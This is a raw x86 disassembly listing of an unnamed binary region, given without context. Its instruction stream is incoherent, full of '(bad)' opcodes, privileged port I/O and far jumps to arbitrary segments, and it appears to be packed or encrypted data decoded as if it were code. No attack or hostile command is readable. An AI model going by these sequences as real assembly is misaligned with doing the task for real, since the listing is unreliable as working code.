  411a0c:	(bad)  
  411a0d:	or     ebx,DWORD PTR [esi+0x4]
  411a10:	xchg   edx,eax
  411a11:	dec    esi
  411a12:	ror    ebp,1
  411a14:	in     eax,dx
  411a15:	fisubr DWORD PTR [ecx-0x6b227db9]
  411a1b:	dec    edx
  411a1c:	xor    eax,DWORD PTR [eax+0x9]
  411a1f:	push   edi
  411a20:	sub    DWORD PTR [esi-0x638f0296],esi
  411a26:	inc    edx
  411a27:	jle    0x4119e1
  411a29:	mov    al,ds:0xf2b8be43
  411a2e:	clc    
  411a2f:	iret   
  411a30:	or     DWORD PTR [edi+esi*4+0x5b],ebx
  411a34:	rsm    
  411a36:	(bad)  
  411a37:	in     al,0x38
  411a39:	pop    edx
  411a3a:	pop    ebp
  411a3b:	mov    ecx,0xcd1fda8d
  411a40:	jmp    0x1bfae093
  411a45:	or     ebx,DWORD PTR [edi+0x2ff92f8]
  411a4b:	imul   ecx,ebx,0xec7ce07b
  411a51:	mov    esp,0xe607b22c
  411a56:	push   cs
  411a57:	dec    eax
  411a58:	push   ebp
  411a59:	mov    ecx,0x82dd27ce
  411a5e:	inc    esi
  411a5f:	fwait
  411a60:	xchg   edx,eax
  411a61:	aas    
  411a62:	mov    es,ebx
  411a64:	mov    ebx,0xff9d42b5
  411a69:	xor    edx,esp
  411a6b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411a6c:	jle    0x4119f4
  411a6e:	xor    eax,0xba354dc7
  411a73:	shr    dh,0xab
  411a76:	sbb    eax,0x22ef04fd
  411a7b:	mov    ecx,0x453b6aa6
  411a80:	mov    ebx,0x245d364d
  411a85:	pop    ss
  411a86:	jo     0x411a6a
  411a88:	mov    esi,0x742b30c5
  411a8d:	push   esp
  411a8e:	mov    bl,0xa4
  411a90:	je     0x411af7
  411a92:	gs xchg esi,eax
  411a94:	mov    ds:0xa7bafc8,al
  411a99:	bnd jno 0x411b11
  411a9c:	fs dec esp
  411a9e:	add    al,0xef
  411aa0:	cmp    DWORD PTR [ecx+esi*2-0x4e],ecx
  411aa4:	in     al,dx
  411aa5:	cmp    cl,BYTE PTR [esp+ecx*2]
  411aa8:	int3   
  411aa9:	jno    0x411afd
  411aab:	cdq    
  411aac:	pop    edx
  411aad:	mov    eax,0xe20317a7
  411ab2:	outs   dx,BYTE PTR ds:[esi]
  411ab3:	inc    ebx
  411ab4:	pop    edi
  411ab5:	mov    eax,ds:0x3c83a37a
  411aba:	xlat   BYTE PTR ds:[ebx]
  411abb:	in     al,0xe7
  411abd:	mov    dl,0x6a
  411abf:	cmc    
  411ac0:	out    0x11,al
  411ac2:	mov    esp,DWORD PTR [eax-0x28]
  411ac5:	pop    es
  411ac6:	gs iret 
  411ac8:	stc    
  411ac9:	es enter 0xe052,0x78
  411ace:	cmp    al,0x21
  411ad0:	pop    ebx
  411ad1:	push   cs
  411ad2:	mov    cl,0x0
  411ad4:	pop    ecx
  411ad5:	sbb    BYTE PTR [eax+eax*8-0x6c],bl
  411ad9:	call   0xf8b34e
  411ade:	adc    bh,0xf3
  411ae1:	pop    esi
  411ae2:	adc    eax,0x6fab2299
  411ae7:	ret    0x2fcf
  411aea:	jbe    0x411a8b
  411aec:	lahf   
  411aed:	stc    
  411aee:	mov    dh,BYTE PTR gs:[eax-0xf931d6e]
  411af5:	pop    edi
  411af6:	xchg   edi,eax
  411af7:	dec    edx
  411af8:	mov    ah,0xdd
  411afa:	jl     0x411ad0
  411afc:	(bad)  
  411afd:	into   
  411afe:	lods   al,BYTE PTR ds:[esi]
  411aff:	jg     0x411ae1
  411b01:	ja     0x411a89
  411b03:	sti    
  411b04:	jp     0x411b69
  411b06:	lock mov dl,dl
  411b09:	aaa    
  411b0a:	mov    ecx,0x914a3105
  411b0f:	jo     0x411a95
  411b11:	test   BYTE PTR [ebp-0x31],ch
  411b14:	int    0x9e
  411b16:	mov    edi,0xa6c47f00
  411b1b:	ja     0x411ae6
  411b1d:	xchg   ebp,ecx
  411b1f:	mov    ebx,0x47a88b77
  411b24:	int    0x56
  411b26:	push   ecx
  411b27:	imul   ebp,DWORD PTR [ebx],0x4d59abb5
  411b2d:	aad    0x57
  411b2f:	mov    ecx,DWORD PTR [edi+0x52]
  411b32:	xor    dl,bh
  411b34:	int    0x7d
  411b36:	(bad)  
  411b37:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411b38:	and    eax,0x32916a1
  411b3d:	add    ebp,DWORD PTR [esi+0x65]
  411b40:	xchg   ebp,eax
  411b41:	repz repz popf 
  411b44:	imul   esp,DWORD PTR [edi-0x5a],0x3ad3809f
  411b4b:	jmp    0x411b94
  411b4d:	mov    edx,0x32806561
  411b52:	cwde   
  411b53:	lods   eax,DWORD PTR ds:[esi]
  411b54:	adc    eax,0x44396e0a
  411b59:	gs and al,ch
  411b5c:	jnp    0x411bab
  411b5e:	scas   al,BYTE PTR es:[edi]
  411b5f:	mov    esi,0x39cae42a
  411b64:	mov    ebx,0xcb53ace1
  411b69:	add    DWORD PTR [ebp-0x3a742ae9],edi
  411b6f:	and    bh,dl
  411b71:	shr    BYTE PTR [eax],1
  411b73:	out    0xf1,al
  411b75:	adc    cl,BYTE PTR [edi-0x479ef8f4]
  411b7b:	(bad)  
  411b7c:	mov    eax,DWORD PTR [ecx-0x538fffed]
  411b82:	pushf  
  411b83:	xor    eax,0x7762cfa
  411b88:	cmp    eax,0x96f2dd29
  411b8d:	mov    al,BYTE PTR [edi-0x16]
  411b90:	push   esp
  411b91:	jb     0x411bc8
  411b93:	and    eax,DWORD PTR [eax+0x36de8360]
  411b99:	dec    ebp
  411b9a:	jae    0x411bcd
  411b9c:	shl    BYTE PTR [esi],1
  411b9e:	je     0x411b76
  411ba0:	mov    eax,0xaea1e156
  411ba5:	das    
  411ba6:	or     eax,0xc3f0cd5e
  411bab:	push   ecx
  411bac:	inc    eax
  411bad:	sub    eax,0xcdf80e55
  411bb2:	or     DWORD PTR [ebx-0x9],0xdb37c0b2
  411bb9:	sahf   
  411bba:	fstp   DWORD PTR [ecx-0x4a]
  411bbd:	int    0x29
  411bbf:	adc    eax,0x51ae2e09
  411bc4:	push   esi
  411bc5:	cld    
  411bc6:	inc    eax
  411bc7:	cmp    DWORD PTR [esi+0x3e1457d6],eax
  411bcd:	sub    BYTE PTR [ebx],bl
  411bcf:	out    dx,eax
  411bd0:	data16 sti 
  411bd2:	fs mov bh,0xd5
  411bd5:	out    0x56,eax
  411bd7:	arpl   WORD PTR [edi-0x646b4ca3],bp
  411bdd:	cmp    BYTE PTR [esi+0x32],bl
  411be0:	aas    
  411be1:	sub    bl,BYTE PTR [ecx+0x728e2da3]
  411be7:	mov    ch,0x5c
  411be9:	push   ebp
  411bea:	aas    
  411beb:	imul   edi,DWORD PTR [ebp-0x13],0xffffffc4
  411bef:	mov    edx,fs
  411bf1:	adc    al,0xf
  411bf3:	sub    edi,DWORD PTR [esi-0x17]
  411bf6:	mov    WORD PTR [ecx],gs
  411bf8:	lea    esi,[edx+0x6b669ce4]
  411bfe:	inc    ebp
  411bff:	loop   0x411c1a
  411c01:	jb     0x411c54
  411c03:	rcr    BYTE PTR [edx-0x7e],0x3a
  411c07:	jle    0x411bc3
  411c09:	mov    al,ds:0x109da249
  411c0e:	pop    edx
  411c0f:	dec    eax
  411c10:	or     al,0x2a
  411c12:	push   cs
  411c13:	data16 fadd DWORD PTR [esi]
  411c16:	cwde   
  411c17:	rcr    BYTE PTR [ecx+0x16],cl
  411c1a:	mov    dl,0x2b
  411c1c:	iret   
  411c1d:	fdivr  DWORD PTR [ecx+0x4]
  411c20:	ins    DWORD PTR es:[edi],dx
  411c21:	pusha  
  411c22:	cli    
  411c23:	outs   dx,DWORD PTR ds:[esi]
  411c24:	pop    ebx
  411c25:	ja     0x411c44
  411c27:	sbb    al,0x8b
  411c29:	xor    cl,BYTE PTR [esi+0x2fa89267]
  411c2f:	shl    edi,cl
  411c31:	inc    edi
  411c32:	cwde   
  411c33:	push   0xdf51483f
  411c38:	(bad)  
  411c39:	loopne 0x411cab
  411c3b:	outs   dx,DWORD PTR ds:[esi]
  411c3c:	dec    ebx
  411c3d:	adc    eax,0x7cb6e918
  411c42:	rol    DWORD PTR [edi],0x7
  411c45:	push   edi
  411c46:	or     BYTE PTR [edi],ch
  411c48:	repz mov ebp,esi
  411c4b:	std    
  411c4c:	mov    ecx,0x3d20c503
  411c51:	or     cl,0xc0
  411c54:	xor    DWORD PTR [ecx],ebp
  411c56:	pop    esp
  411c57:	enter  0xc0e4,0x5
  411c5b:	das    
  411c5c:	lods   eax,DWORD PTR ds:[esi]
  411c5d:	adc    al,0x4b
  411c5f:	or     ebx,ecx
  411c61:	ins    DWORD PTR es:[edi],dx
  411c62:	push   ebx
  411c63:	stos   BYTE PTR es:[edi],al
  411c64:	in     eax,0xf0
  411c66:	sar    BYTE PTR [esp+edi*4+0xa],cl
  411c6a:	repz jl 0x411c1d
  411c6d:	push   edx
  411c6e:	jp     0x411c58
  411c70:	loop   0x411c18
  411c72:	rol    BYTE PTR [ebx+ecx*8+0x123c37f3],0xf1
  411c7a:	popf   
  411c7b:	rcr    DWORD PTR [esi+esi*4+0x5866da9d],1
  411c82:	or     al,0x74
  411c84:	push   0x38
  411c86:	repnz shl BYTE PTR fs:[edi-0x556e21d6],0x65
  411c8f:	pop    edx
  411c90:	stos   DWORD PTR es:[edi],eax
  411c91:	jbe    0x411c29
  411c93:	xor    al,0x5c
  411c95:	les    esp,FWORD PTR [ebp-0x6351c5ab]
  411c9b:	stos   BYTE PTR es:[edi],al
  411c9c:	jmp    0x411cf3
  411c9e:	mov    eax,ds:0xd214418d
  411ca3:	push   edi
  411ca4:	shl    DWORD PTR [edi+0xd],0xa
  411ca8:	add    edi,DWORD PTR [esi-0x17d5bc45]
  411cae:	and    dl,dh
  411cb0:	jo     0x411c8c
  411cb2:	mov    al,0xfe
  411cb4:	and    DWORD PTR [edx+ebx*4+0x68eeeccc],ecx
  411cbb:	cmc    
  411cbc:	cld    
  411cbd:	jmp    0x7bdbdaed
  411cc2:	leave  
  411cc3:	mov    edi,DWORD PTR [edx]
  411cc5:	pusha  
  411cc6:	jg     0x411c78
  411cc8:	mov    ebp,0x12c8fef1
  411ccd:	cmp    DWORD PTR [ebx+0x72ebb40a],ebx
  411cd3:	adc    cl,BYTE PTR [edi]
  411cd5:	popf   
  411cd6:	sub    bl,BYTE PTR [ebx+0x3b76a7ad]
  411cdc:	xchg   ebx,eax
  411cdd:	mov    eax,esi
  411cdf:	or     DWORD PTR [ecx+ecx*1],0x5795a8c5
  411ce6:	or     al,BYTE PTR [eax]
  411ce8:	sub    BYTE PTR [eax-0x20],al
  411ceb:	std    
  411cec:	stos   BYTE PTR es:[edi],al
  411ced:	pushf  
  411cee:	ds push 0x81be330c
  411cf4:	arpl   WORD PTR [ebp+0x5202feaa],sp
  411cfa:	pop    ebp
  411cfb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411cfc:	or     bl,BYTE PTR [ecx-0x72e88d91]
  411d02:	jp     0x411c9d
  411d04:	add    ebx,ebx
  411d06:	stos   DWORD PTR es:[edi],eax
  411d07:	add    eax,0x64dd0634
  411d0c:	cld    
  411d0d:	push   ecx
  411d0e:	in     eax,0xc4
  411d10:	aas    
  411d11:	fcmovne st,st(5)
  411d13:	or     cl,BYTE PTR [eax]
  411d15:	or     ecx,ecx
  411d17:	lahf   
  411d18:	cmc    
  411d19:	ja     0x411d13
  411d1b:	pop    es
  411d1c:	or     DWORD PTR [edi-0x73f1a24e],eax
  411d22:	jmp    0x3f0839fd
  411d27:	mov    eax,ds:0x147f35d7
  411d2c:	retf   
  411d2d:	rcr    BYTE PTR [esi-0x2c],0xdb
  411d31:	xor    BYTE PTR [edx],bh
  411d33:	xor    eax,0x9f2b8c7d
  411d38:	fisubr WORD PTR [edi-0x5e]
  411d3b:	sbb    DWORD PTR [esp+0x2e846986],edi
  411d42:	adc    al,0xcd
  411d44:	xor    BYTE PTR [esi-0x4b681ff3],bh
  411d4a:	cdq    
  411d4b:	repz and ebp,edi
  411d4e:	mov    esp,0xb43d96c0
  411d53:	das    
  411d54:	xchg   bh,bh
  411d56:	es inc esi
  411d58:	xchg   edi,eax
  411d59:	ror    ah,1
  411d5b:	jmp    0xf6a56f9
  411d60:	mov    BYTE PTR [ecx+0x765b49ce],dh
  411d66:	push   es
  411d67:	mov    DWORD PTR [edi],ebp
  411d69:	dec    esi
  411d6a:	retf   
  411d6b:	mov    dl,0x1b
  411d6d:	xor    eax,0x8837af61
  411d72:	push   ds
  411d73:	test   al,0xf7
  411d75:	dec    esi
  411d76:	inc    edi
  411d77:	pusha  
  411d78:	(bad)  
  411d79:	mov    ch,cl
  411d7b:	adc    eax,0xe92e1249
  411d80:	add    bl,BYTE PTR [esi+ebx*2+0xa1ea5ef]
  411d87:	cmp    eax,0x9298797
  411d8c:	adc    ecx,DWORD PTR [ebx+ecx*2]
  411d8f:	(bad)  
  411d90:	sar    BYTE PTR [edx+0x6111241],1
  411d96:	inc    ebp
  411d97:	xlat   BYTE PTR ds:[ebx]
  411d98:	xor    al,0xc
  411d9a:	fwait
  411d9b:	push   ebx
  411d9c:	add    BYTE PTR [edi+0x6627bb47],al
  411da2:	dec    ebp
  411da3:	lods   al,BYTE PTR ds:[esi]
  411da4:	mov    bl,0x2
  411da6:	mov    dl,0xc1
  411da8:	xchg   ebp,eax
  411da9:	les    eax,FWORD PTR [edi+ecx*1]
  411dac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411dad:	push   esp
  411dae:	cmp    eax,0x34c919f5
  411db3:	mov    eax,0xee161cda
  411db8:	nop
  411db9:	mov    edx,0x5f206387
  411dbe:	push   esi
  411dbf:	fstp   TBYTE PTR [eax+esi*4+0x6ef5d9f5]
  411dc6:	nop    DWORD PTR [esi-0x344eab5]
  411dcd:	inc    ecx
  411dce:	mov    WORD PTR [edx+ebx*2],ss
  411dd1:	lds    esi,FWORD PTR [eax]
  411dd3:	(bad)  
  411dd4:	daa    
  411dd5:	aas    
  411dd6:	add    cl,dl
  411dd8:	je     0x411d9e
  411dda:	lods   eax,DWORD PTR ds:[esi]
  411ddb:	add    ebx,esp
  411ddd:	dec    edx
  411dde:	jge    0x411dbc
  411de0:	je     0x411de6
  411de2:	add    BYTE PTR [edx],ch
  411de4:	jae    0x411d96
  411de6:	pop    ebp
  411de7:	push   edx
  411de8:	pop    ebp
  411de9:	jo     0x411dc8
  411deb:	adc    BYTE PTR [esi+0x78c12ab3],ch
  411df1:	dec    edi
  411df2:	loop   0x411ded
  411df4:	dec    ecx
  411df5:	fwait
  411df6:	xchg   ebp,eax
  411df7:	jmp    0x411e21
  411df9:	rol    BYTE PTR [ebp+0x13],cl
  411dfc:	sbb    eax,0xcdb677ff
  411e01:	das    
  411e02:	xlat   BYTE PTR ds:[ebx]
  411e03:	nop
  411e04:	not    BYTE PTR [edx-0x24]
  411e07:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411e08:	mov    esi,0xd1d9c795
  411e0d:	add    bh,0x1a
  411e10:	in     eax,0xa4
  411e12:	pop    esi
  411e13:	cmp    DWORD PTR [eax],eax
  411e15:	in     eax,dx
  411e16:	aas    
  411e17:	mov    ebp,0xd22a0c5d
  411e1c:	push   edi
  411e1d:	add    dh,bl
  411e1f:	out    0x3b,eax
  411e21:	push   esi
  411e22:	add    cl,BYTE PTR [ebp-0x4e]
  411e25:	aaa    
  411e26:	pop    esp
  411e27:	aad    0x13
  411e29:	jp     0x411e15
  411e2b:	arpl   WORD PTR [ebx-0x14b85e94],sp
  411e31:	leave  
  411e32:	mov    es,esi
  411e34:	repnz mov ds:0xc2c435b6,eax
  411e3a:	call   FWORD PTR [edx-0x11887350]
  411e40:	cwde   
  411e41:	push   eax
  411e42:	ret    
  411e43:	push   edx
  411e44:	fstp   QWORD PTR [esi+0x4f]
  411e47:	mov    WORD PTR [ebx],es
  411e49:	add    ecx,DWORD PTR [esi-0x2975f100]
  411e4f:	jge    0x411e53
  411e51:	test   eax,0x8b48e4de
  411e56:	cmp    DWORD PTR [ebp-0x46],esp
  411e59:	int    0x55
  411e5b:	sub    al,0xb6
  411e5d:	fwait
  411e5e:	pop    esi
  411e5f:	in     al,0x19
  411e61:	mov    DWORD PTR [edi],edi
  411e63:	push   ss
  411e64:	int3   
  411e65:	jp     0x411e9c
  411e67:	shl    BYTE PTR [esi+0x856f1f4],0x34
  411e6e:	je     0x411e5e
  411e70:	sbb    al,0xc9
  411e72:	dec    eax
  411e73:	fnsave [eax+0x3fef33eb]
  411e79:	jmp    0x69af5b0c
  411e7e:	shl    DWORD PTR [esi-0x4],1
  411e81:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411e82:	jbe    0x411e6f
  411e84:	fstp   QWORD PTR [eax]
  411e86:	fistp  QWORD PTR [eax]
  411e88:	sbb    BYTE PTR [esi+0x766ce190],0x22
  411e8f:	and    al,dl
  411e91:	(bad)  
  411e92:	push   edx
  411e93:	rcl    DWORD PTR [ebx+edx*4-0xd],cl
  411e97:	dec    esp
  411e98:	jb     0x411e90
  411e9a:	sub    dh,BYTE PTR [esi-0xf78b99d]
  411ea0:	mov    ds:0x64aa00f,al
  411ea5:	call   0xde5f:0x95e71533
  411eac:	pop    es
  411ead:	cmc    
  411eae:	pop    edi
  411eaf:	jmp    0x411ead
  411eb1:	retf   
  411eb2:	imul   ecx,DWORD PTR [esi-0x38be063a],0x39636393
  411ebc:	xchg   DWORD PTR [ecx],edx
  411ebe:	inc    ecx
  411ebf:	rcr    BYTE PTR [ecx+0x6688f8d9],0xa5
  411ec6:	xor    DWORD PTR [esi],esp
  411ec8:	icebp  
  411ec9:	push   edx
  411eca:	sbb    BYTE PTR [eax],dl
  411ecc:	fadd   st(2),st
  411ece:	adc    DWORD PTR [edx],0x56bdda95
  411ed4:	ja     0x411f06
  411ed6:	dec    ebx
  411ed7:	call   0xbb94:0xfa39a0e5
  411ede:	ret    
  411edf:	xchg   ecx,eax
  411ee0:	test   DWORD PTR [esi+0x41],edi
  411ee3:	stc    
  411ee4:	in     eax,0xa1
  411ee6:	arpl   di,di
  411ee8:	(bad)  
  411ee9:	mov    eax,ds:0x684294bc
  411eee:	push   ds
  411eef:	add    BYTE PTR [esi],0xb
  411ef2:	push   esi
  411ef3:	js     0x411edf
  411ef5:	push   esi
  411ef6:	outs   dx,DWORD PTR ds:[esi]
  411ef7:	jns    0x411f2c
  411ef9:	test   DWORD PTR [esp+ebp*2],ebp
  411efc:	and    al,0x1e
  411efe:	lods   eax,DWORD PTR ds:[esi]
  411eff:	nop
  411f00:	ss int 0xa4
  411f03:	dec    edx
  411f04:	int3   
  411f05:	pusha  
  411f06:	add    DWORD PTR [ebp+0x4ab406e1],0x39d42d38
  411f10:	mov    ch,0x14
  411f12:	sbb    al,0xd0
  411f14:	in     al,0x1
  411f16:	xchg   BYTE PTR [esi+eax*8-0x4d],bh
  411f1a:	loopne 0x411f9b
  411f1c:	xchg   BYTE PTR [ebx-0x786420cf],dh
  411f22:	loopne 0x411efd
  411f24:	xchg   ecx,eax
  411f25:	sub    al,0xf5
  411f27:	(bad)
  411f2b:	lahf   
  411f2c:	int3   
  411f2d:	adc    ch,BYTE PTR [ecx]
  411f2f:	fwait
  411f30:	aad    0xd8
  411f32:	xor    DWORD PTR [edx+0x58056e9f],ebp
  411f38:	es cmc 
  411f3a:	mov    BYTE PTR fs:[esi-0x18],dl
  411f3e:	dec    ebp
  411f3f:	dec    edi
  411f40:	in     eax,0xb2
  411f42:	jnp    0x411f0a
  411f44:	add    BYTE PTR [ebp+0x5],0x5b
  411f48:	in     eax,dx
  411f49:	repz pop ecx
  411f4b:	mov    ecx,0xd60f8312
  411f50:	std    
  411f51:	mov    dh,0xf6
  411f53:	add    bl,bl
  411f55:	cmp    eax,DWORD PTR [ebp+0x39]
  411f58:	jb     0x411eea
  411f5a:	xor    DWORD PTR [esi],0x2ff07bd3
  411f60:	ds push ebp
  411f62:	hlt    
  411f63:	jecxz  0x411fa5
  411f65:	out    dx,eax
  411f66:	out    dx,eax
  411f67:	and    ch,BYTE PTR [ebp-0x1ae8d8d7]
  411f6d:	jae    0x411f24
  411f6f:	jbe    0x411f61
  411f71:	stc    
  411f72:	jge    0x411f44
  411f74:	jo     0x411f13
  411f76:	sub    dh,BYTE PTR [edx]
  411f78:	aam    0xa8
  411f7a:	test   al,0x62
  411f7c:	int3   
  411f7d:	fdivr  DWORD PTR [ecx+eax*4]
  411f80:	push   edi
  411f81:	loop   0x411f46
  411f83:	ret    0x188c
  411f86:	fcmovnb st,st(2)
  411f88:	or     eax,0x97a8110e
  411f8d:	js     0x411fb4
  411f8f:	in     al,0xb6
  411f91:	xchg   esp,eax
  411f92:	cmp    DWORD PTR [esp+edi*2+0x6a],0xffffffac
  411f97:	push   cs
  411f98:	data16 xor al,al
  411f9b:	jb     0x411ffd
  411f9d:	imul   esi,DWORD PTR [ebx+0x63385ea0],0xffffffb7
  411fa4:	jae    0x411fdb
  411fa6:	sbb    eax,0x72898878
  411fab:	sti    
  411fac:	or     BYTE PTR [esi+edx*2-0x6f62d7c3],cl
  411fb3:	xchg   esp,eax
  411fb4:	out    0xdf,al
  411fb6:	fstp   QWORD PTR [ebp-0x2860ccb1]
  411fbc:	pop    esp
  411fbd:	inc    ebp
  411fbe:	imul   edi,DWORD PTR [esi-0x41b41e1],0xffffffcd
  411fc5:	mov    eax,ds:0x141a90f9
  411fca:	int3   
  411fcb:	lock mov ah,BYTE PTR [eax+0x76]
  411fcf:	add    BYTE PTR ds:0xc55f6bf5,0xe7
  411fd6:	mov    dh,0x25
  411fd8:	sbb    ah,BYTE PTR [ecx]
  411fda:	push   eax
  411fdb:	ja     0x41203e
  411fdd:	jmp    0x4dfa58a5
  411fe2:	repnz sbb DWORD PTR [esi+0x6ebf5dff],0x862e7ce2
  411fed:	bound  edi,QWORD PTR gs:[ebp+0x64]
  411ff1:	push   ebp
  411ff2:	push   ebp
  411ff3:	ss pop ecx
  411ff5:	xchg   edx,eax
  411ff6:	cld    
  411ff7:	mov    al,0x11
  411ff9:	gs push 0x5e8ae8a1
  411fff:	jmp    0xe122:0x3ccc5309
  412006:	xchg   edi,eax
  412007:	mov    dh,0x31
  412009:	push   esp
  41200a:	int    0x2f
  41200c:	or     esi,ebx
  41200e:	mov    ds:0x47de9eec,eax
  412013:	dec    esp
  412014:	loop   0x411fd7
  412016:	push   esp
  412017:	ror    ah,1
  412019:	and    esi,DWORD PTR [esi-0x80]
  41201c:	pop    ebx
  41201d:	aaa    
  41201e:	lahf   
  41201f:	cmp    DWORD PTR [ecx],ebp
  412021:	ja     0x412037
  412023:	inc    edx
  412024:	dec    BYTE PTR [esi-0x33685625]
  41202a:	inc    ebx
  41202b:	sbb    eax,0xa7c650a2
  412030:	inc    esi
  412031:	cmp    al,0xd
  412033:	adc    al,0xc6
  412035:	lods   eax,DWORD PTR ds:[esi]
  412036:	cs int 0x37
  412039:	jns    0x412075
  41203b:	test   al,0x19
  41203d:	sbb    eax,DWORD PTR [esi+eax*2-0x67]
  412041:	call   0x26b6365d
  412046:	mov    dh,0xed
  412048:	sub    al,0xa4
  41204a:	mov    eax,0x520aed6b
  41204f:	mov    ebx,0xac69d7cf
  412054:	ds ret 0x66b8
  412058:	inc    esp
  412059:	pop    ss
  41205a:	cmp    ah,BYTE PTR [eax]
  41205c:	pushf  
  41205d:	sbb    BYTE PTR [ebp+0x68],dl
  412060:	mov    esi,0x5426beac
  412065:	test   al,0xc4
  412067:	shl    esp,cl
  412069:	dec    ebp
  41206a:	mov    ecx,0x72facc56
  41206f:	mov    edx,0xb6cfbca7
  412074:	mov    ch,0x94
  412076:	sub    eax,0x533b16c5
  41207b:	push   edi
  41207c:	cs mov bh,0xf7
  41207f:	out    dx,al
  412080:	loop   0x4120e6
  412082:	push   eax
  412083:	int3   
  412084:	xor    eax,DWORD PTR [edx+0x1f295e86]
  41208a:	cdq    
  41208b:	fwait
  41208c:	jmp    0xbee7:0xacaa83a8
  412093:	imul   esi,DWORD PTR [eax-0x7048cf9e],0xa3f6d0a3
  41209d:	xor    eax,0x631ff4f7
  4120a2:	adc    al,0xb2
  4120a4:	fcmovne st,st(5)
  4120a6:	adc    BYTE PTR [ecx-0x1ab3746f],0xd8
  4120ad:	hlt    
  4120ae:	stc    
  4120af:	push   es
  4120b0:	adc    BYTE PTR [ebp+0x24],bl
  4120b3:	add    ch,bh
  4120b5:	xchg   esp,eax
  4120b6:	add    esi,edx
  4120b8:	mul    DWORD PTR [eax]
  4120ba:	repz mov eax,0x98155466
  4120c0:	ret    0x7e38
  4120c3:	daa    
  4120c4:	lods   al,BYTE PTR ds:[esi]
  4120c5:	jns    0x412055
  4120c7:	(bad)  
  4120c8:	mov    esp,0x5e6c55b8
  4120cd:	cld    
  4120ce:	push   ebx
  4120cf:	pop    ebp
  4120d0:	add    dl,BYTE PTR [edx]
  4120d2:	sbb    esi,eax
  4120d4:	mov    bh,0x12
  4120d6:	jmp    0x4b25:0x5b8f762e
  4120dd:	in     eax,0x75
  4120df:	push   eax
  4120e0:	vmaxss xmm2,xmm6,DWORD PTR [eax+0x22]
  4120e5:	pop    eax
  4120e6:	or     eax,0xe172e04b
  4120eb:	pop    ebp
  4120ec:	dec    edx
  4120ed:	push   ds
  4120ee:	jne    0x41212b
  4120f0:	inc    esi
  4120f1:	cs push edi
  4120f3:	ds loop 0x412169
  4120f6:	mov    al,ds:0x1f43ebff
  4120fb:	inc    esi
  4120fc:	das    
  4120fd:	fwait
  4120fe:	std    
  4120ff:	aaa    
  412100:	push   es
  412101:	inc    ebx
  412102:	cli    
  412103:	in     eax,0x7c
  412105:	ret    
  412106:	or     DWORD PTR [esi-0x1f477411],edx
  41210c:	loope  0x4120e8
  41210e:	cmp    al,0x81
  412110:	mov    al,ds:0xea7bae7f
  412115:	push   cs
  412116:	inc    ebx
  412117:	les    edi,FWORD PTR [edx]
  412119:	aam    0xbc
  41211b:	push   0x6fc9a23f
  412120:	cmc    
  412121:	test   DWORD PTR [eax-0x745719d9],ebp
  412127:	nop
  412128:	or     al,0x1e
  41212a:	lods   al,BYTE PTR ds:[esi]
  41212b:	jle    0x412127
  41212d:	les    edi,FWORD PTR ds:0x1a1bf670
  412133:	add    bh,BYTE PTR [eax+0x16]
  412136:	ds or  al,0xeb
  412139:	hlt    
  41213a:	pop    es
  41213b:	cs push eax
  41213d:	push   eax
  41213e:	xchg   ebp,eax
  41213f:	cwde   
  412140:	mov    ebx,DWORD PTR [esi-0x411be97]
  412146:	leave  
  412147:	ja     0x4120ee
  412149:	xor    dl,BYTE PTR [ecx+0x4a4110ca]
  41214f:	ins    DWORD PTR es:[edi],dx
  412150:	push   ebx
  412151:	inc    ebp
  412152:	in     eax,0x42
  412154:	push   ss
  412155:	mov    esi,ebp
  412157:	icebp  
  412158:	pop    ebx
  412159:	mov    al,ds:0x9de015f8
  41215e:	out    dx,eax
  41215f:	mov    eax,0x2529a8b8
  412164:	lea    eax,[eax+0x2b]
  412167:	outs   dx,BYTE PTR ds:[esi]
  412168:	scas   eax,DWORD PTR es:[edi]
  412169:	cmp    DWORD PTR [ecx+edx*2+0x7e5e777b],ecx
  412170:	jmp    0x52a8:0x7326c936
  412177:	imul   edi,esp,0x15
  41217a:	std    
  41217b:	or     DWORD PTR [ecx-0x16aa2a38],ebp
  412181:	jbe    0x412187
  412183:	rcr    DWORD PTR [esi+0x2fdb0d10],1
  412189:	repz xchg esp,eax
  41218b:	jl     0x41213e
  41218d:	fwait
  41218e:	icebp  
  41218f:	and    al,0x1a
  412191:	int3   
  412192:	es scas eax,DWORD PTR es:[edi]
  412194:	loope  0x4121c9
  412196:	repnz dec eax
  412198:	xor    BYTE PTR [ecx+ebp*1],al
  41219b:	into   
  41219c:	sbb    esi,DWORD PTR [edi+ecx*8+0x73]
  4121a0:	mov    esp,0x4fd333e1
  4121a5:	dec    eax
  4121a6:	add    BYTE PTR [ebp-0x6f],ah
  4121a9:	fbstp  TBYTE PTR [edx+esi*4-0x5f912344]
  4121b0:	(bad)
  4121b3:	dec    esp
  4121b4:	test   DWORD PTR [esi*2+0x7e11c0fb],edx
  4121bb:	hlt    
  4121bc:	jl     0x4121e3
  4121be:	loope  0x4121cd
  4121c0:	xor    BYTE PTR [edi-0x2897a763],bh
  4121c6:	loop   0x412179
  4121c8:	add    BYTE PTR ds:0xbac4b063,0x20
  4121cf:	icebp  
  4121d0:	inc    esi
  4121d1:	sbb    eax,0x7e64c023
  4121d6:	sti    
  4121d7:	int    0x1e
  4121d9:	jno    0x412175
  4121db:	inc    eax
  4121dc:	cmp    ebp,DWORD PTR [eax-0x73]
  4121df:	fnstenv [edi+0x39]
  4121e2:	mov    edi,ebp
  4121e4:	cmp    eax,0x94a5be11
  4121e9:	fld    QWORD PTR [eax-0x34]
  4121ec:	cld    
  4121ed:	test   BYTE PTR [ecx],al
  4121ef:	push   es
  4121f0:	xor    bh,bh
  4121f2:	not    DWORD PTR [edi]
  4121f4:	iret   
  4121f5:	(bad)  
  4121f6:	rcl    DWORD PTR [edx-0x6c0c7c12],1
  4121fc:	fistp  DWORD PTR [edi+0xe]
  4121ff:	mov    al,0x67
  412201:	pusha  
  412202:	outs   dx,BYTE PTR ds:[esi]
  412203:	inc    edx
  412204:	lea    ecx,[edi+0x72dcbf26]
  41220a:	jecxz  0x41227d
  41220c:	data16 sub al,0x38
  41220f:	jno    0x412226
  412211:	js     0x41221a
  412213:	mov    al,0xd5
  412215:	in     eax,dx
  412216:	xchg   BYTE PTR [eax],cl
  412218:	push   eax
  412219:	inc    ebx
